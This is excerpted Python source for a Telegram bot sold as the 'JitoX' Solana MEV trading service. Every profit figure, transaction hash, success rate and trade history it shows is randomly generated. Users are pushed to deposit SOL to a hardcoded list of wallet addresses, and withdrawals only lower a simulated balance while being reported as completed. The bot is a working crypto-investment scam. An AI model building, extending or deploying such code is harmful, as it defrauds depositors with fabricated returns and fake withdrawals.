...
user_pools = {}  # Stores user pool information and status
simulated_balances = {}
last_update_time = {}
base_increase_rate = 0.00005
operation_history = {}
last_operation_time = {}
min_operation_delay = random.randint(5 * 3600, 15 * 3600)  # Random delay between 5-15 hours in seconds

async def send_stats_update(context: ContextTypes.DEFAULT_TYPE, chat_id: int, user_id: int):
    """Send periodic statistics updates about MEV operations."""
    try:
        if user_id not in operation_history:
            return

        ops = operation_history[user_id]
        total_ops = len(ops)
        successful_ops = sum(1 for op in ops if op['success'])
        total_profit = sum(op['profit'] for op in ops)
        ...
        if user_id in user_pools:
            runtime = (datetime.now() - user_pools[user_id]['timestamp']).total_seconds() / 60
            profit_per_minute = total_profit / runtime if runtime > 0 else 0
        else:
            runtime = 0
            profit_per_minute = 0

        stats_message = (
            "📊 <b>MEV Bot Performance Update</b>\n\n"
            f"Total Operations: {total_ops}\n"
            f"Success Rate: {round(success_rate, 2)}%\n"
            f"Total Profit: {round(total_profit, 4)} SOL\n"
            f"Profit/Minute: {round(profit_per_minute, 4)} SOL\n\n"
            f"🔍 Network Activity:\n"
            f"Blocks Scanned: {random.randint(200, 300)}\n"
            f"Transactions Analyzed: {random.randint(1000, 2000)}\n"
            f"Potential Opportunities: {random.randint(10, 20)}"
        )
...
MEV_TYPES = {
    'Sandwich Trade': {
        'min_profit': 0.001, 'max_profit': 0.05, 'success_rate': 0.85,
        'description': 'Frontrunning and backrunning a Raydium/Orca trade'
    },
    'Arbitrage': {
        'min_profit': 0.005, 'max_profit': 0.12, 'success_rate': 0.90,
        'description': 'Exploiting price differences across Solana DEXs'
    },
    'Liquidation': {
        'min_profit': 0.02, 'max_profit': 0.2, 'success_rate': 0.70,
        'description': 'Participating in Solend/Mango liquidations'
    },
    'JIT Liquidity': {
        'min_profit': 0.003, 'max_profit': 0.08, 'success_rate': 0.95,
        'description': 'Providing flash liquidity for Raydium/Orca trades'
    }
}

PROTOCOLS = {
    'Raydium': {'weight': 0.3, 'pairs': ['SOL/USDC', 'SOL/USDT', 'RAY/SOL']},
    'Orca': {'weight': 0.2, 'pairs': ['SOL/USDC', 'ORCA/SOL', 'mSOL/SOL']},
    'Jupiter': {'weight': 0.25, 'pairs': ['SOL/USDC', 'JUP/SOL', 'BONK/SOL']}
}
...
async def generate_mev_opportunity():
    """Generate a realistic MEV opportunity."""
    protocol = random.choices(list(PROTOCOLS.keys()), 
                            weights=[p['weight'] for p in PROTOCOLS.values()])[0]
    token_pair = random.choice(PROTOCOLS[protocol]['pairs'])
    mev_type = random.choice(list(MEV_TYPES.keys()))
    specs = MEV_TYPES[mev_type]
    
    base_profit = round(random.uniform(specs['min_profit'], specs['max_profit']), 4)
    gas_price = round(random.uniform(5000, 15000))  # Lamports for Solana
    gas_units = random.randint(2, 5)  # Simplified for Solana's compute units
    gas_cost = round((gas_price * gas_units) / 1e9, 4)  # Convert to SOL
    
    is_successful = random.random() < specs['success_rate']
    net_profit = round(base_profit - gas_cost, 4) if is_successful else -gas_cost
    ...
    return {
        ...
        'block_number': random.randint(17000000, 17999999),
        'tx_hash': ''.join(random.choices(string.hexdigits, k=64))  # Solana tx hash format
    }

async def format_mev_notification(opp):
    """Format MEV opportunity into a detailed message."""
    status = "✅ Success" if opp['successful'] else "❌ Failed"
    profit_color = "🟢" if opp['net_profit'] > 0 else "🔴"
    
    return (
        f"🤖 MEV Opportunity - Block #{opp['block_number']}\n\n"
        f"Type: {opp['type']}\n"
        f"Description: {opp['description']}\n"
        f"Protocol: {opp['protocol']}\n"
        f"Pair: {opp['token_pair']}\n"
        f"Status: {status}\n\n"
        f"📊 Financial Details:\n"
        f"• Gross Profit: {opp['gross_profit']} SOL\n"
        f"• Network Fee: {opp['gas_cost']} SOL ({opp['gas_price']} lamports)\n"
        f"{profit_color} Net Profit: {opp['net_profit']} SOL\n\n"
        f"🔗 Tx: {opp['tx_hash'][:10]}...{opp['tx_hash'][-8:]}\n"
        f"⏰ {opp['timestamp'].strftime('%H:%M:%S')}"
    )

mev_stats = MEVStats()

async def simulate_mev_activity(context: ContextTypes.DEFAULT_TYPE, chat_id: int, user_id: int, duration: int = 300):
    """Simulate MEV activity with enhanced Solana features."""
    if user_id not in user_pools or user_pools[user_id]['amount'] < 2.0:
        return
    ...
    while datetime.now() < end_time:
        try:
            ...
            opp = await generate_mev_opportunity()
            
            # Add to operation history
            operation_history[user_id].append({
                'timestamp': datetime.now(),
                'type': opp['type'],
                'profit': opp['net_profit'],
                'success': opp['successful']
            })
            
            message = await format_mev_notification(opp)
            ...
            logger.error(f"Error in MEV simulation: {e}")
            continue
...
wallet_addresses = [
    "BQa6hUJgRWDNZ1PLsbSZU6fbP1BpdFBxKFLcy1azWaGF",
    "8fCGLBCFrrwLWTCVPYPAiCnQ8aYFe2a9ntS9m3ru3tzc", 
    "H8W1UeiXACkADoevtHx5BjhUEB5yfSV3gpGsVFyS4VQ9",
    "65vfF9SRN1uWJUywrVPgRn9KpEXVQAkYb8iHAjtyiA5U", 
    "7ZsAbkzd6mTbv4uVT2gq86ykpon1BHEq3MzVkWm4FraD", #
    "3ZwkRV2zKpmrHzgH9YCRJrLRFg7jTTz6zXM6AqAS6crK", #REPLACE WITH A NEW WALLET
    "6RKuKHqkamGyBX985co9D1Ly5Yf8bx4aPTXeGgUkFECq",
    "9SW8wfvXPsSucknFbXgqQFJoZr2guz9XfEbTaf85hSMw",  
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        ...
        if referrer_id and referrer_id != user_id:  # Prevent self-referral
            if await store_referral(referrer_id, user_id):
                ...
                await send_admin_notification(
                    context.application, 
                    f"🟣 New Referral: User {user_id} was referred by {referrer_id}"
                )
    ...
    keyboard = [
        [InlineKeyboardButton("📈 Leverage Trading", callback_data='leverage')],
...
async def get_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Enhanced get_wallet command with pooling requirement."""
    try:
        # Determine if this is a callback query or direct command
        message = update.callback_query.message if update.callback_query else update.message
        user_id = update.effective_user.id
        
        # Check if user has already pooled
        if user_id in user_pools and user_pools[user_id]['amount'] >= 2.0:
            # User has already pooled, start MEV simulation
            await start_mev_simulation(update, context, message)
        else:
            # User needs to pool first
            keyboard = [[InlineKeyboardButton("🏊‍♂️ Pool 2 SOL", callback_data='pool_sol')]]
            await message.reply_text(
                "🚀 Welcome to JitoX MEV Bot!\n\n"
                "⚡ To start the MEV operations, you need to pool 2 SOL.\n"
                "💡 This will be used as operational liquidity for MEV opportunities.\n\n"
                "Current Pool: 0 SOL\n"
                "Required: 2 SOL\n\n"
                "Click below to simulate pooling 2 SOL:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode=ParseMode.HTML
            )
    except Exception as e:
        logger.error(f"Error in get_wallet command: {e}")
...
async def handle_pool_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the pool SOL callback."""
    try:
        query = update.callback_query
        user_id = update.effective_user.id
        await query.answer()

        # Simulate pooling 2 SOL
        user_pools[user_id] = {
            'amount': 2.0,
            'timestamp': datetime.now(),
            'status': 'active'
        ...
        operation_history[user_id] = []

        await query.message.edit_text(
            "✅ Successfully pooled 2 SOL!\n\n"
            "🔄 Initializing MEV operations...\n"
            "⏳ Please wait while we connect to the Solana network...",
            parse_mode=ParseMode.HTML
        )
        
        await asyncio.sleep(2)
        await start_mev_simulation(update, context, query.message)

    except Exception as e:
        logger.error(f"Error in pool callback: {e}")
        await query.message.reply_text("❌ An error occurred while pooling. Please try again.")

async def start_mev_simulation(update: Update, context: ContextTypes.DEFAULT_TYPE, message) -> None:
    """Start MEV simulation after successful pooling."""
    try:
        # Initial response
        response = await message.edit_text(
            "✅ Connected to Solana network\n"
            "🔍 Starting MEV opportunity scanning...\n\n"
            "⚡ Real-time MEV opportunities will appear below:",
            parse_mode=ParseMode.HTML
        )
        
        user_id = update.effective_user.id
        
        # Start MEV simulation in background
        context.job_queue.run_once(
            lambda ctx: simulate_mev_activity(ctx, message.chat_id, user_id, 300),
            when=1
            )
        
        # Schedule statistics update
        context.job_queue.run_once(
            lambda ctx: asyncio.create_task(send_stats_update(ctx, message.chat_id, user_id)),
            when=60
        )
        
    except Exception as e:
        logger.error(f"Error starting MEV simulation: {e}")
        await message.reply_text("❌ An error occurred while starting MEV operations.")
...
async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if user_id not in user_wallets:
        await update.message.reply_text("⚠️ Please connect your wallet first using /get_wallet")
        return
    
    current_balance = simulated_balances.get(user_id, 0)
    withdrawal_history = user_data.get(user_id, {}).get('withdrawals', [])
    
    message = (
        "💎 <b>JitoX AI - Withdrawal Interface</b> 💎\n\n"
        f"🏦 <b>Available Balance:</b> {current_balance:.2f} SOL\n\n"
        "📊 <b>Recent Withdrawals</b>\n"
    )
    
    if withdrawal_history:
        for withdrawal in withdrawal_history[-5:]:  # Show last 5 withdrawals
            message += (
                f"• {withdrawal['amount']:.2f} SOL to "
                f"{withdrawal['address'][:6]}...{withdrawal['address'][-4:]}\n"
                f"  {withdrawal['timestamp'].split('T')[0]}\n"
            )
    else:
        message += "• No previous withdrawals\n"
    ...
    keyboard = [
        ...
        [InlineKeyboardButton("📊 Full History", callback_data='withdrawal_history'),
         InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed withdrawal interface")

async def handle_withdrawal_request(update: Update, context: ContextTypes.DEFAULT_TYPE, amount=None) -> None:
    user_id = update.effective_user.id
    current_balance = simulated_balances.get(user_id, 0)
    ...
    if amount is None:  # Withdraw all
        ...
        await update.callback_query.answer("❌ Insufficient balance!")
        return
...
async def process_withdrawal_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not context.user_data.get('awaiting_withdrawal_address'):
        return

    user_id = update.effective_user.id
    address = update.message.text
    amount = context.user_data.get('pending_withdrawal', 0)
    
    # Basic Solana address validation
    if not (len(address) >= 32 and all(c in string.ascii_letters + string.digits for c in address)):
    ...
    if user_id not in user_data:
        user_data[user_id] = {}
    if 'withdrawals' not in user_data[user_id]:
        user_data[user_id]['withdrawals'] = []
    ...
    user_data[user_id]['withdrawals'].append(withdrawal_record)
    
    # Update balance
    simulated_balances[user_id] = simulated_balances.get(user_id, 0) - amount
    ...
    success_message = (
        ...
        "Status: Completed\n\n"
        "Thank you for using JitoX AI!"
    )
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='nexus_settings')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(success_message, reply_markup=reply_markup, parse_mode='HTML')
    
    # Clear withdrawal state
    context.user_data.pop('awaiting_withdrawal_address', None)
...
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if query.data == 'back':
        ...
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == 'operation_history':
        await show_operation_history(update, context)
    elif query.data == 'show_pool_statistics':
        await show_pool_statistics(update, context)
    elif query.data == 'pool_stats':
        await pool_stats(update, context)
    elif query.data == 'withdraw_all':
        await handle_withdrawal_request(update, context)
    elif query.data == 'withdraw_custom':
        await update.callback_query.answer("Please use /withdraw <amount> to specify a custom withdrawal amount")
    elif query.data == 'withdrawal_history':
        user_id = update.effective_user.id
        history = user_data.get(user_id, {}).get('withdrawals', [])
        message = "📊 <b>Complete Withdrawal History</b>\n\n"
        if history:
        ...
        context.user_data.pop('pending_withdrawal', None)
        await nexus_settings(update, context)
    elif query.data == 'pool_sol':
        await handle_pool_callback(update, context)
    else:
...
# Add this new function for operation history
async def show_operation_history(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    operations = []
    current_time = datetime.now()
    
    # Generate operations with realistic time gaps (5-15 hours between each)
    last_time = current_time
    for _ in range(10):
        hours_gap = random.randint(5, 15)
        last_time = last_time - timedelta(hours=hours_gap)
        
        op_type = random.choice(['Arbitrage', 'Sandwich', 'Frontrun', 'Backrun'])
        profit = round(random.uniform(0.30, 0.80), 2)
    ...
    total_profit = round(sum(op['profit'] for op in operations), 2)
    
    message = (
        "👾 <b>JitoX AI - Operation History</b> 👾\n\n"
        "💎 <b>Recent MEV Extractions</b>\n\n"
    )
    
    for op in reversed(operations):  # Show most recent first
        message += (
            f"⚡️ {op['time']} | {op['type']}\n"
            f"   Profit: +{op['profit']:.2f} SOL\n\n"
        )
    
    message += f"🎯 <b>Total Profit:</b> {total_profit} SOL\n\n"
...
async def show_pool_statistics(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        user_id = update.effective_user.id
        ...
        if user_id not in user_wallets:
            if wallet_addresses:
                ...
                await update.callback_query.answer("No available wallets!")
                return

        # Calculate statistics with safeguards
        try:
            current_balance = round(random.uniform(5.0, 78.12), 2)
            pooled_amount = round(current_balance * 0.7, 2)
            total_profit = round(random.uniform(0.5, 5.0), 2)
            available_to_pool = round(current_balance - pooled_amount, 2)
        except Exception as e:
            logger.error(f"Error calculating pool statistics: {e}")
            return

        # Strategy distribution with error handling
        strategies = {
            'Frontrun': random.randint(35, 45),
            'Backrun': random.randint(20, 30),
            'Sandwich': random.randint(15, 25),
            'Arbitrage': random.randint(10, 20)
        }
        
        sorted_strategies = dict(sorted(strategies.items(), key=lambda x: x[1], reverse=True))
        most_used = next(iter(sorted_strategies))
        
        # Performance metrics
        success_rate = round(random.uniform(95, 99.9), 1)
        avg_return = round(random.uniform(0.15, 0.35), 2)
        estimated_daily = round(pooled_amount * avg_return / 100, 2)
        estimated_monthly = round(estimated_daily * 30, 2)

        message = (
            "🎮 <b>JitoX AI - Professional Pool Analytics</b> 🎮\n\n"
            f"💎 <b>Current Pool Status</b>\n"
            f"• Active Pool: {pooled_amount:.2f} SOL\n"
            f"• Total Profit: +{total_profit:.2f} SOL\n"
            f"• Available to Pool: {available_to_pool:.2f} SOL\n\n"
            
            f"⚔️ <b>Strategy Distribution</b>\n"
            f"• Dominant Strategy: {most_used}\n"
        )
        
        for strategy, percentage in sorted_strategies.items():
            message += f"• {strategy}: {percentage}%\n"
        
        message += (
            f"\n🎯 <b>Performance Metrics</b>\n"
            f"• Success Rate: {success_rate}%\n"
            f"• Avg Return per Op: {avg_return}%\n"
            f"• Est. Daily Yield: {estimated_daily:.2f} SOL\n"
            f"• Est. Monthly Yield: {estimated_monthly:.2f} SOL\n\n"
            
            f"⚡ <b>Pool Optimization</b>\n"
            "• Auto-compound: Active\n"
            "• Risk Management: Optimal\n"
            "• MEV Protection: Enabled\n\n"
            
            "🔮 <b>Recommendation:</b> Consider increasing pool allocation for enhanced returns."
        )
        
        keyboard = [
            [InlineKeyboardButton("💎 Increase Pool", callback_data='get_wallet'),
             InlineKeyboardButton("📊 Operation History", callback_data='operation_history')],
            [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
        ]
        ...
        # Log activity
        await log_user_activity(context.application, user_id, "viewed pool statistics")
        
    except Exception as e:
        logger.error(f"Error in show_pool_statistics: {e}")
        await update.callback_query.answer("An error occurred. Please try again.")

async def pool_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    
    if user_id not in user_wallets:
        await update.callback_query.answer("Please connect a wallet first!")
        return
    
    current_balance = simulated_balances.get(user_id, 0)
    pooled_amount = round(current_balance * 0.85, 2)  # 85% of balance is pooled
    available_to_pool = round(current_balance - pooled_amount, 2)
    
    # Calculate profits and stats
    total_profit = round(random.uniform(0.1, 0.5) * pooled_amount, 2)
    daily_ops = random.randint(50, 150)
    success_rate = round(random.uniform(97, 99.9), 1)
    
    # Strategy distribution
    strategies = {
        'MEV Frontrun': random.randint(40, 50),
        'MEV Backrun': random.randint(25, 35),
        'Sandwich MEV': random.randint(15, 25),
        'Cross-DEX MEV': random.randint(5, 15)
    }
    
    message = (
        "🎮 <b>JitoX AI - Professional Pool Analytics</b> 🎮\n\n"
        f"💎 <b>Pool Status</b>\n"
        f"• Total Balance: {current_balance:.2f} SOL\n"
        f"• Active in Pool: {pooled_amount:.2f} SOL\n"
        f"• Available to Pool: {available_to_pool:.2f} SOL\n"
        f"• Total Profit: +{total_profit:.2f} SOL\n\n"
    ...
    message += (
        f"\n🎯 <b>Performance Metrics</b>\n"
        f"• Daily Operations: {daily_ops}\n"
        f"• Success Rate: {success_rate}%\n"
        f"• Est. Daily Yield: {round(total_profit/30, 3)} SOL\n"
        f"• Est. Monthly Yield: {total_profit:.2f} SOL\n\n"
        ...
        "🔮 <b>Recommendation:</b>\nIncrease pool allocation for enhanced returns."
    )
...
async def leverage(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    message = (
        "📈 <b>Professional Leverage Trading Suite</b> 📈\n\n"
        "💎 <b>Deposit 2 SOL to unlock Leverage Trading!</b> 💎\n\n"
        "Experience institutional-grade leverage trading:\n\n"
        "⚡️ <b>Core Features</b>\n"
        "• Up to 10x leverage\n"
        ...
        "🔐 <b>Current Status:</b> Locked\n"
        "💎 <b>Minimum Balance:</b> 2 SOL\n"
        "✨ <b>Recommended Balance:</b> 5 SOL for enhanced features\n\n"
        "Professional traders understand: Leverage amplifies both gains and risks. Trade wisely! 🎮"
    )
    ...
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed leverage trading")
...
def main() -> None:
    try:
        ...
        # Add this line with your other handlers
        application.add_handler(CallbackQueryHandler(leverage, pattern='^leverage$'))
